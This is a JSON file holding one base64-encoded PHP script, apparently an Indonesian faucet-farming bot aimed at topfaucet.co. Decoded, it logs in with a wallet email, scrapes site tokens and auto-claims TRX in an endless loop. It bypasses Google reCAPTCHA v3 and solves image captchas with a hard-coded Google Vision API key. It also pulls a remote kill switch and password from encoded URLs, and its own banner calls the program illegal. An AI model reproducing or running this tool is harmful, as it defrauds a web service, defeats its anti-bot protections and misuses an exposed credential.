{"script":{"topfaucet":"Y29uc3QKdGl0bGUgPSAiYXBra3UiOwoKCmZ1bmN0aW9uIHMoKXskcmVzPWZpbGVfZ2V0X2NvbnRlbnRzKGJhc2U2NF9kZWNvZGUoImFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDFONWRXdHliMjR4TWk5VGVYVnJjbTl1TVRJdmJXRnBiaTl6WlhKMlpYSXVjR2h3IikpOyRkdT1leHBsb2RlKCcjJyxleHBsb2RlKCcjJy50aXRsZS4nOicsJHJlcylbMV0pWzBdOyRjdT1leHBsb2RlKCd8JywkZHUpWzBdOztpZigkY3UgPT0gIm9mZiIgfHwgJGN1ID09IG51bGwpe2JuMSgpO2VjaG8kbWVyYWguIlwzM1szMTsxbSBTY3JpcHQgRGkgTm9uYWt0aWZrYW5cbiI7ZWNobyRtZXJhaC4iXDMzWzMxOzFtIEJ5IE1zayBPZmZpY2lhbCBcbiI7ZXhpdDt9aWYoJGN1PT0ib24iKXt9fXMoKTsKZnVuY3Rpb24gYW5pbWFzaSgkc3RyKSB7ICRhcnIgPSBzdHJfc3BsaXQoJHN0cik7Zm9yZWFjaCAoJGFyciBhcyAkYXopIHsgZWNobyAkYXo7IHVzbGVlcCgzMDApOyB9fWZ1bmN0aW9uIGNlaygkc3RyKSB7JGFyciA9IHN0cl9zcGxpdCgkc3RyKTsgZm9yZWFjaCgkYXJyIGFzICRheikge2VjaG8gJGF6OyB1c2xlZXAoOTAwMCk7fX1mdW5jdGlvbiBmYXN0KCRzdHIpeyRyYXIgPSBzdHJfc3BsaXQoJHN0cik7Zm9yZWFjaCgkcmFyIGFzICR6eil7ZWNobyAkeno7dXNsZWVwKDMwMDApO319ZnVuY3Rpb24gYW4oJHN0cil7ICRhcnIgPSBzdHJfc3BsaXQoJHN0cik7IGZvcmVhY2ggKCRhcnIgYXMgJGF6KXsgZWNobyAkYXo7IHVzbGVlcCgxOTk5OSk7fX1mdW5jdGlvbiBsb2FkKCRkYXRhLCAkZmlsZSl7JGhhbmRsZSA9IGZvcGVuKCRmaWxlLCAndycpO2Z3cml0ZSgkaGFuZGxlLCAkZGF0YSk7ZmNsb3NlKCRoYW5kbGUpOyB9ZnVuY3Rpb24gZ2FyaXMoKXtlY2hvICRwdXRpaC4iJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAIi4kZW5kLiJcbiI7fQoKZnVuY3Rpb24gYygpe3N5c3RlbSgnY2xlYXInKTt9CmZ1bmN0aW9uIHdlYigkdXJsKXskY2g9Y3VybF9pbml0KCk7Y3VybF9zZXRvcHQoJGNoLENVUkxPUFRfVVJMLCR1cmwpO2N1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTtjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7cmV0dXJuIGN1cmxfZXhlYygkY2gpO30KZnVuY3Rpb24geCgkYXdhbCwkYWtoaXIsJHJlcywkbm8peyRkYXRhID0gZXhwbG9kZSgkYXdhbCxleHBsb2RlKCRha2hpciwkcmVzKVskbm9dKVswXTtyZXR1cm4gJGRhdGE7fQoKZnVuY3Rpb24gU2xvdygkbXNnKXskc2xvdyA9IHN0cl9zcGxpdCgkbXNnKTtmb3JlYWNoKCAkc2xvdyBhcyAkc2xvd21vICl7IGVjaG8gJHNsb3dtbzsgdXNsZWVwKDEwMDApO319CQoKZnVuY3Rpb24gU2F2ZSgkbmFtYWRhdGEpe2lmKGZpbGVfZXhpc3RzKCRuYW1hZGF0YSkpeyRkYXRhID0gZmlsZV9nZXRfY29udGVudHMoJG5hbWFkYXRhKTt9ZWxzZXskZGF0YSA9IHJlYWRsaW5lKCJcMDMzWzE7MzJtIElucHV0ICIuJG5hbWFkYXRhLiIgOiAgIik7ZmlsZV9wdXRfY29udGVudHMoJG5hbWFkYXRhLCRkYXRhKTt9cmV0dXJuICRkYXRhO31zKCk7CmZ1bmN0aW9uIHB3KCl7CnBzOgokZD1kYXRlKCdEJyk7CgokZ2V0PWZpbGVfZ2V0X2NvbnRlbnRzKGJhc2U2NF9kZWNvZGUoImFIUjBjSE02THk5eVpXNTBjbmt1WTI4dmNHRnpPVFV2Y21GMyIpKTsKCiRsaW5rID0ganNvbl9kZWNvZGUoJGdldCktPlBhc3N3b3JkLT4kZC0+TGluazsKJGxpbmsyID0ganNvbl9kZWNvZGUoJGdldCktPlBhc3N3b3JkLT4kZC0+TGluazI7ICRwdyA9IGpzb25fZGVjb2RlKCRnZXQpLT5QYXNzd29yZC0+JGQtPlBhc3N3b3JkOyBpZigkbGluayl7CiRyZWFkID0gZmlsZV9nZXRfY29udGVudHMoJ2tleS50eHQnKTsKaWYoJHJlYWQgIT0gJHB3KXsKYm4xKCk7CmVjaG8gIiBcMDMzWzE7MzJtIExJbmsgMSBcMDMzWzE7MzJtOiBcMDMzWzE7OTdtJGxpbmtcbiI7CgogICAgICAgICAgICAkcCA9IHJlYWRsaW5lKCIgXDAzM1sxOzMybUlucHV0IFwwMzNbMTszMm06IFwwMzNbMTs5N20iKTsKICAgICAgICAgICAgICAgIGlmKCRwID09ICRwdyl7CiAgICAgICAgICAgICAgICAgICAgYm4xKCk7CiAgICAgICAgICAgICAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJ2tleS50eHQnLCRwKTsKICAgICAgICAgICAgICAgICAgICBlY2hvIiBcMDMzWzE7MzJtUGFzc3dvcmQgQ29ycmVjdCIaIFxuIjsKICAgICAgICAgICAgICAgICAgICBzbGVlcCgxKTsKICAgICAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgICAgIGJuMSgpOwogICAgICAgICAgICAgICAgICAgIGVjaG8iIFwwMzNbMTszMW0gSW52YWxpZCBQYXNzd29yZCFcbiI7CiAgICAgICAgICAgICAgICAgICAgZ290byBwczsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9ZWxzZXsKICAgICAgICB9Cn1lbHNlewoKICAgZWNobyAiIFwwMzNbMTszMW1QbGVhc2UgY2VrIHlvdXIgY29uZWN0aW9uIVxuIjsKICAgIGV4aXQ7Cn0KfVN5c3RlbSgiY2xlYXIiKTtwdygpO2Z1bmN0aW9uIHRtcigkdG1lcil7JGNvbG9yID0gYXJyYXkoIlwwMzNbMTszN20iLCJcMDMzWzA7MzFtIiwiXDAzM1swOzMzbSIsIlwwMzNbMDszMm0iLCJcMDMzWzA7MzRtIiwiXDAzM1swOzM1bSIpOyR0aW1lcj10aW1lKCkrJHRtZXI7d2hpbGUodHJ1ZSk6ZWNobyJcciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxyIjskcmVzPSR0aW1lci10aW1lKCk7IGlmKCRyZXMgPCAxKXticmVhazt9JHRtID0gIGRhdGUoJyBpOnMgJywkcmVzKTtlY2hvIiBcMDMzWzE7MzdtIFsiLiRjb2xvcltyYW5kKDAsY291bnQoJGNvbG9yKS0xKV0uJHRtLiJcMDMzWzE7MzdtXSI7c2xlZXAoMSk7ZW5kd2hpbGU7fQogZnVuY3Rpb24gZ2coJHVybCwgJHVhKXtyZXR1cm4gY3VybCgkdXJsLCBudWxsLCAkdWEpWzFdO30KIGZ1bmN0aW9uIHBwKCR1cmwsICRkYXRhLCAkdWEpe3JldHVybiBjdXJsKCR1cmwsICRkYXRhLCAkdWEpWzFdO30KZnVuY3Rpb24gYmFzZTY0KCRzdHIpe3JldHVybiBiYXNlNjRfZW5jb2RlKCRzdHIpO30KZnVuY3Rpb24gZ2V0KCR1cmwpe3JldHVybiBjdXJsKCR1cmwsIG51bGwsIGhlYWQoKSlbMV07fQpmdW5jdGlvbiBwb3N0KCR1cmwsJGRhdGEpe3JldHVybiBjdXJsKCR1cmwsICRkYXRhLCBoZWFkKCkpWzFdO30KZnVuY3Rpb24gZ2V0c29sdmUoJHNvbCl7cmV0dXJuIGN1cmwoJHNvbCwgbnVsbCwgc29sdmUoKSlbMV07fQpmdW5jdGlvbiBhbnN3ZXIoJHgsJHksJHope2lmKCR4ICsgJHkgPT0gJHope3JldHVybiAiYWRkIjt9ZWxzZWlmKCR4IC0gJHkgPT0gJHope3JldHVybiAic3ViIjt9ZWxzZWlmKCR4ICogJHkgPT0gJHope3JldHVybiAibXVsdGlwbHkiO31lbHNlaWYoJHggJSAkeSl7cmV0dXJuICJkaXZpZGUiO31lbHNle3JldHVybiAwO319CmZ1bmN0aW9uIGN1cmwoJHVybCwgJHBvc3QgPSAwLCAkaHR0cGhlYWRlciA9IDAsICRwcm94eSA9IDApewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIHRydWUpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgZmFsc2UpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMzApOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCA2MCk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRSxUUlVFKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwiY29va2llLnR4dCIpOwogICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwiY29va2llLnR4dCIpOwogICAgICAgIGlmKCRwb3N0KXsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJHBvc3QpOwogICAgICAgIH0KICAgICAgICBpZigkaHR0cGhlYWRlcil7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaHR0cGhlYWRlcik7CiAgICAgICAgfQogICAgICAgIGlmKCRwcm94eSl7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQUFJPWFlUVU5ORUwsIHRydWUpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUFJPWFksICRwcm94eSk7CiAgICAgICAgICAgIC8vIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QUk9YWVRZUEUsIENVUkxQUk9YWV9TT0NLUzUpOwogICAgICAgIH0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCB0cnVlKTsKICAgICAgICAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICAgICAkaHR0cGNvZGUgPSBjdXJsX2dldGluZm8oJGNoKTsKICAgICAgICBpZighJGh0dHBjb2RlKSByZXR1cm4gIkN1cmwgRXJyb3IgOiAiLmN1cmxfZXJyb3IoJGNoKTsgZWxzZXsKICAgICAgICAgICAgJGhlYWRlciA9IHN1YnN0cigkcmVzcG9uc2UsIDAsIGN1cmxfZ2V0aW5mbygkY2gsIENVUkxJTkZPX0hFQURFUl9TSVpFKSk7CiAgICAgICAgICAgICRib2R5ID0gc3Vic3RyKCRyZXNwb25zZSwgY3VybF9nZXRpbmZvKCRjaCwgQ1VSTElORk9fSEVBREVSX1NJWkUpKTsKICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgICAgICAgICByZXR1cm4gYXJyYXkoJGhlYWRlciwgJGJvZHkpOwogICAgICAgIH0KICAgIH0KCmZ1bmN0aW9uIGhlYWQoKXsKJHVhW109Ikhvc3Q6IHRvcGZhdWNldC5jbyI7CiR1YVtdPSJBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiOwoKCiAgcmV0dXJuICR1YTsKfQpmdW5jdGlvbiBzb2x2ZSgpewokdWFbXT0iSG9zdDogYXBpLXNlY3VyZS5zb2x2ZW1lZGlhLmNvbSI7CiR1YVtdPSJ1c2VyLWFnZW50OiAiLmZpbGVfZ2V0X2NvbnRlbnRzKCJ1c2VyLWFnZW50Iik7CiR1YVtdPSJhY2NlcHQtbGFuZ3VhZ2U6IGlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IjsKIHJldHVybiAkdWE7Cn0KZnVuY3Rpb24gdjMoKXsKJGhbXT0iSG9zdDogd3d3Lmdvb2dsZS5jb20iOwokaFtdPSJDb29raWU6ICIuZmlsZV9nZXRfY29udGVudHMoImNvb2tpZV9hbmNob3IiKTsKJGhbXT0iVXNlci1BZ2VudDogIi5maWxlX2dldF9jb250ZW50cygidXNlci1hZ2VudCIpOwpyZXR1cm4gJGg7Cn0KZnVuY3Rpb24gcmV2MygpewoKd2hpbGUodHJ1ZSl7CiRhY3IgPWZpbGVfZ2V0X2NvbnRlbnRzKCJ1cmxfYW5jaG9yIik7CiRjb3I9ZXhwbG9kZSgnJicsZXhwbG9kZSgnJms9JywkYWNyKVsxXSlbMF07CiRrID0gZXhwbG9kZSgiJiIsJGFjcilbMV07CiRjbyA9IGV4cGxvZGUoIiYiLCRhY3IpWzJdOwokdiA9IGV4cGxvZGUoIiYiLCRhY3IpWzRdOwokdjMgPSBjdXJsKCRhY3IsbnVsbCx2MygpKVsxXTsKJHYzdG9rZW4gPSBleHBsb2RlKCciJyxleHBsb2RlKCdpZD0icmVjYXB0Y2hhLXRva2VuIiB2YWx1ZT0iJywkdjMpWzFdKVswXTsKJGFjcjIgPSAiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYXBpMi9yZWxvYWQ/az0kY29yIjsKJGRhdGEgPSAiJHYmcmVhc29uPXEmYz0kdjN0b2tlbiYkdiYkY28iOwokdjNfdmVyaWYgPSBjdXJsKCRhY3IyLCAkZGF0YSwgdjMoKSlbMV07CiR2MzEgPSBleHBsb2RlKCciJyxleHBsb2RlKCcicnJlc3AiLCInLCR2M192ZXJpZilbMV0pWzBdOwogIGlmKCR2MzEpewogICAgICAgICAgICAgICAgZWNobyBTbG93KCJ7JG1lcmFofSBnZXQgY2FwdGNoYS4gICAgIFxyIik7IApzbGVlcCgxKTsKICAgICAgICAgICAgICAgIHJldHVybiAkdjMxOwogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIFNsb3coIiB7JG1lcmFofSBwbGVhc2Ugd2FpdCAgICAgICAgICAgIFxyIik7CiAgICAgICAgICAgIH0KICAgIH0KfQpmdW5jdGlvbiBjYXB0Y2hhKCl7CiRnbWJhcj1maWxlX2dldF9jb250ZW50cygnaW1hZ2UuanBnJyk7CiRiYXNlPWJhc2U2NCgkZ21iYXIpOwokdWEgPSBhcnJheSgpOwokdWFbXSA9ICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IFJNWDMxOTEgQnVpbGQvUlAxQS4yMDA3MjAuMDExOykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzk4LjAuNDc1OC44NyBNb2JpbGUgU2FmYXJpLzUzNy4zNiI7CiR1YVtdID0gImNvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vanNvbiI7CiRjaCA9IGN1cmxfaW5pdCgpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly92aXNpb24uZ29vZ2xlYXBpcy5jb20vdjEvaW1hZ2VzOmFubm90YXRlP2tleT1BSXphU3lDM3ktRW00Mmh0U0I4VUVaUHFwdEo3OHJsdkw1OF9oNlkiKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hUVFBIRUFERVIsICR1YSk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICd7InJlcXVlc3RzIjpbeyJpbWFnZSI6eyJjb250ZW50IjoiJy4kYmFzZS4nIn0sImZlYXR1cmVzIjpbeyJ0eXBlIjoiVEVYVF9ERVRFQ1RJT04ifV19XX0nKTsKJHJlcyA9IGN1cmxfZXhlYygkY2gpOwokdmFyMT0gZXhwbG9kZSgnInRleHQiOiAiRW50ZXIgdGhlIGZvbGxvd2luZzpcbicsICRyZXMpOwokdmFyMiA9IGV4cGxvZGUoJ1xuIicsICR2YXIxWzFdKTsKJHZhcjMgPSAkdmFyMlswXTsKJGNhcD1zdHJfcmVwbGFjZSgnXG4nLCcgJywkdmFyMyk7CiRjYXBjaGEgPSBwcmVnX3JlcGxhY2UoIi9bXmEtel0vIiwgIiIsICRjYXApOwpyZXR1cm4gJGNhcGNoYTsKfQoKZnVuY3Rpb24gYm90KCR4LCR5LCR6KXtyZXR1cm4gWyIrIi4keS4iKyIuJHouIisiLiR4LCIrIi4keC4iKyIuJHkuIisiLiR6LCIrIi4keC4iKyIuJHouIisiLiR5LCIrIi4keS4iKyIuJHguIisiLiR6LCIrIi4kei4iKyIuJHkuIisiLiR4LCIrIi4kei4iKyIuJHguIisiLiR5XTt9CmZ1bmN0aW9uIGJuMSgpewpzeXN0ZW0oImNsZWFyIik7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCmVjaG8gZmFzdCgiXDAzM1sxOzk3bVxuJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAXG4iKTsKZWNobyBmYXN0KCJcMDMzWzE7MzFtICAgICBfXyAgIF9fX19fX18gICAgICAgICBfX19fX18gICAgICAgICAgXyAgICAgICAgICAgICAgICAgIFxuIik7CmVjaG8gZmFzdCgiXDAzM1sxOzMxbSAgICAgXCBcIC8gLyAgX18gXCAgICAgICB8ICBfX19ffCAgICAgICAgfCB8ICAgICAgICAgICAgICAgICBcbiIpOwplY2hvIGZhc3QoIlwwMzNbMTszMW0gICAgICBcIFYgL3wgfCAgfCB8X19fX19ffCB8X18gX18gXyBfIF9fIHwgfF8gX18gXyBfX18gXyAgIF8gXG4iKTsKZWNobyBmYXN0KCJcMDMzWzE7MzFtICAgICAgID4gPCB8IHwgIHwgfF9fX19fX3wgIF9fLyBfYCB8ICdfIFx8IF9fLyBfYCAvIF9ffCB8IHwgfFxuIik7CmVjaG8gZmFzdCgiXDAzM1sxOzk3bSAgICAgIC8gLiBcfCB8X198IHwgICAgICB8IHwgfCAoX3wgfCB8IHwgfCB8fCAoX3wgXF9fIFwgfF98IHxcbiIpOwplY2hvIGZhc3QoIlwwMzNbMTs5N20gICAgIC9fLyBcX1xfX19fXy8gICAgICAgfF98ICBcX18sX3xffCB8X3xcX19cX18sX3xfX18vXF9fLCB8XG4iKTsKZWNobyBmYXN0KCJcMDMzWzE7OTdtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfXy8gfFxuIik7CmVjaG8gZmFzdCgiXDAzM1sxOzk3bSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8X19fLyBcbiIpOwplY2hvIGZhc3QoIlwwMzNbMTs5N21cbyUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAJSUAAFxuIik7fQogICAgZnVuY3Rpb24gYm4yKCl7CiAKZmFzdCggIlwzM1szMTsxba2IVyAgra1Xra2Ira2IVyIuJGVuZCk7ZmFzdCggIlwzM1szMjsxbSAgfxNdIENSRUFUT1IgICA6XGVbMTszN20gTVNLXG4iLiRlbmQpOwpmYXN0KCAiXDMzWzMxOzFtf62Id62IdX2IrXVQda2IVyIuJGVuZCk7ZmFzdCggIlwzM1szMjsxbSBbE10gVEhBTktTIFRPIDpcZVsxOzM3bSBUSEUgT05FIEFMTUlHSFRZIEdPRFxuIi4kZW5kKTsKZmFzdCggIiBcMzNbMzE7MW1ara2IdV0gra1RICWIrVEiLiRlbmQpO2Zhc3QoICJcMzNbMzI7MW0gfxNdIFNVUFBPUlQgICA6XGVbMTszN20gQUxMIFRFQU0gWEQtRkFOVEFTWVxuIi4kZW5kKTsKZmFzdCggIlxlWzE7MzdtJa2Ida2IVyWIrVEgJa2IUSIuJGVuZCk7ZmFzdCggIlwzM1szMjsxbSBbE10gU1VQUE9SVCAgIDpcZVsxOzM3bSBCQUJZQk9UIENIQU5ORUxcbiIuJGVuZCk7CmZhc3QoICJcZVsxOzM3ba2IdV0gra1Xra2Ira2IdV0iLiRlbmQpO2Zhc3QoICJcMzNbMzI7MW0gfxNdIFNDUklQVCAgICA6XGVbMTszN20gQVBQXG4iLiRlbmQpOwpmYXN0KCAiXGVbMTszN21adV0gJX9QfX9QdXVQdV0iLiRlbmQpO2Zhc3QoICJcMzNbMzI7MW0gIH8TXSBWRVJTSU9OICAgOlxlWzE7MzdtIDEuMFxuIi4kZW5kKTsgIApnYXJpcygpOwpmYXN0KCJ7JG1lcmFofxMgV0FSTklORyEgUFJPR1JBTSBJTEVHQUwgU0VHQUxBIFJFU0lLTyBESSBUQU5HR1VORyBTRU5ESVJJXG4iKTsKZ2FyaXMoKTt9CgoKYm4xKCk7CiRtYWlsID0gU2F2ZSgiRW1haWxfZnAiKTsKCgpyOgokcmVzID0gZ2V0KCJodHRwczovL3RvcGZhdWNldC5jby8iKTsKJGNzcmYgPSBleHBsb2RlKCciJyxleHBsb2RlKCdjc3JmX3Rva2VuX25hbWUiIGlkPSJ0b2tlbiIgdmFsdWU9IicsJHJlcylbMV0pWzBdOwoKJGRhdGEgPSAid2FsbGV0PSRtYWlsJmNzcmZfdG9rZW5fbmFtZT0kY3NyZiI7CiRyZXMgPSBwb3N0KCJodHRwczovL3RvcGZhdWNldC5jby9hdXRoL2xvZ2luIiwkZGF0YSk7CiRzdWM9ZXhwbG9kZSgiJyIsZXhwbG9kZSgiaHRtbDogJyIsJHJlcylbMV0pWzBdOwokc3RzPWV4cGxvZGUoJzwvZGl2PicsZXhwbG9kZSgnPGRpdiBjbGFzcz0iYWxlcnQgdGV4dC1jZW50ZXIgYWxlcnQtZGFuZ2VyIj48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLWNpcmNsZSI+PC9pPiAnLCRyZXMpWzFdKVswXTsKaWYoJHN1Yz09IkxvZ2luIFN1Y2Nlc3MiKXsKZWNobyJ7JGhpamF1fSBMb2dpbiBTdWNjZXNzXG4iOwpzbGVlcCgzKTsKfWVsc2V7CmdvdG8gcjt9CnN5c3RlbSgiY2xlYXIiKTsKYm4yKCk7CgoKCm1hbnVhbDoKd2hpbGUodHJ1ZSl7CiRyZXMgPSBnZXQoImh0dHBzOi8vdG9wZmF1Y2V0LmNvL2ZhdWNldC9jdXJyZW5jeS90cngiKTsKJGxpID0gZXhwbG9kZSgiPCIsZXhwbG9kZSgnPHAgY2xhc3M9ImxoLTEgbWItMSBmb250LXdlaWdodC1ib2xkIj4nLCRyZXMpWzNdKVswXTsKCmlmKCRsaT09IjAvMjAwMCIpewplY2hvIiRtZXJhaCBDbGFpbSBMZWZ0IEhhYmlzXG4iOwpleGl0Owp9CgokYWYgPSBleHBsb2RlKCciJyxleHBsb2RlKCdhdXRvX2ZhdWNldF90b2tlbiIgdmFsdWU9IicsJHJlcylbMV0pWzBdOwokY3NyZiA9IGV4cGxvZGUoJyInLGV4cGxvZGUoJ2NzcmZfdG9rZW5fbmFtZSIgaWQ9InRva2VuIiB2YWx1ZT0iJywkcmVzKVsxXSlbMF07CiR0ayA9IGV4cGxvZGUoJyInLGV4cGxvZGUoJ25hbWU9InRva2VuIiB2YWx1ZT0iJywkcmVzKVsxXSlbMF07CiR0aW1lID0gZXhwbG9kZSgnLCcsZXhwbG9kZSgnbGV0IHRpbWVyID0gJywkcmVzKVsxXSlbMF07CmlmKCR0aW1lKXsKdG1yKCR0aW1lKTsKfQoKCiRkYXRhID0gImF1dG9fZmF1Y2V0X3Rva2VuPSRhZiZjc3JmX3Rva2VuX25hbWU9JGNzcmYmdG9rZW49JHRrIjsKJHJlcyA9IHBvc3QoImh0dHBzOi8vdG9wZmF1Y2V0LmNvL2ZhdWNldC92ZXJpZnkvdHJ4IiwkZGF0YSk7CiRzdWM9ZXhwbG9kZSgiYWNjb3VudCIsZXhwbG9kZSgiaHRtbDogJzAiLCRyZXMpWzFdKVswXTsKJHN0cz1leHBsb2RlKCc8L2Rpdj4nLGV4cGxvZGUoJzxkaXYgY2xhc3M9ImFsZXJ0IHRleHQtY2VudGVyIGFsZXJ0LWRhbmdlciI+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi1jaXJjbGUiPjwvaT4gJywkcmVzKVsxXSlbMF07CmlmKCRzdWMhPSIiKXsKJHJlcyA9IGdldCgiaHR0cHM6Ly90b3BmYXVjZXQuY28vZmF1Y2V0L2N1cnJlbmN5L3RyeCIpOwokdXNlcm5hbWUgPSBleHBsb2RlKCI8IixleHBsb2RlKCc8cD4nLCRyZXMpWzFdKVswXTsKJGJhbCA9IGV4cGxvZGUoIjwiLGV4cGxvZGUoJzxwIGNsYXNzPSJsaC0xIG1iLTEgZm9udC13ZWlnaHQtYm9sZCI+JywkcmVzKVszXSlbMF07CiRyZXMgPSBnZXQoImh0dHBzOi8vYml0dGVuLm1lL3NvbC9mYXVjZXQiKTsKCmVjaG8gU2xvdygiJGhpamF1ID5fICRncHV0aWggR29vZCBqb2IsIDAkc3VjICBcbiIpOwplY2hvIFNsb3coIiRoaWphdSA+XyAkd2hpdGUgQ2xhaW1sZWZ0JHllbGxvdyB+PiRwdXRpaCAkYmFsIFxuIik7CgpnYXJpcygpOwoKZ290byBtYW51YWw7Cn1lbHNlewp9Cn0KCg=="}}
